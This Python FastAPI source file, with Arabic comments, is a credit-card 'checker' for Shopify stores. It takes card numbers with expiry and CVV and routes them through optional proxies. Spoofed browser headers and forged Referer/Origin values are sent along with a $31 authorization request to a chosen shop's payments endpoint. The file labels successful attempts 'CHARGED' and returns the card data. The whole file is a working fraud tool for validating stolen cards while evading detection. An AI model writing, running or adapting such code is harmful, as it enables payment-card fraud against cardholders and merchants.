from fastapi import FastAPI, Query, Request
import httpx

app = FastAPI()

# Headers متوافقة تماماً مع متصفحات Shopify
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Referer": "",
    "Origin": ""
}

@app.api_route("/check", methods=["GET", "POST"])
async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
            
        request_headers = HEADERS.copy()
        request_headers["Referer"] = f"{site}/"
        request_headers["Origin"] = site

        cc_parts = cc.split('|')
        # بيانات البطاقة المطلوبة لـ Shopify Payments
        payload = {
            "card[number]": cc_parts[0],
            "card[expiry_month]": cc_parts[1],
            "card[expiry_year]": cc_parts[2],
            "card[cvv]": cc_parts[3],
            "amount": "31.0"
        }

        # معالج البروكسي
        formatted_proxy = None
        if proxy:
            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
            if "@" in clean_proxy:
                formatted_proxy = f"http://{clean_proxy}"
            else:
                parts = clean_proxy.split(":")
                if len(parts) == 4:
                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    formatted_proxy = f"http://{clean_proxy}"
                    
        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None

        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
            # المسار الرسمي لـ Shopify Payments
            target_url = f"{site}/payments/authorize"
            response = await client.post(target_url, data=payload)
            
            # تحليل الرد الخاص بـ Shopify
            resp_msg = "CARD_DECLINED"
            status = "false"
            
            try:
                data = response.json()
                # Shopify يعيد غالباً message أو error في حال الرفض
                if data.get("success") == True:
                    resp_msg = "CHARGED"
                    status = "true"
                else:
                    resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
            except:
                resp_msg = "CARD_DECLINED"
            
            return {
                "Gateway": "Shopify Payments",
                "Price": "31.0",
                "Proxy": "Live" if proxy else "None",
                "Response": resp_msg,
                "Status": status,
                "CC": cc
            }

    except Exception as e:
        return {
            "Gateway": "Shopify Payments",
            "Price": "31.0",
            "Proxy": "Error",
            "Response": "CARD_DECLINED",
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
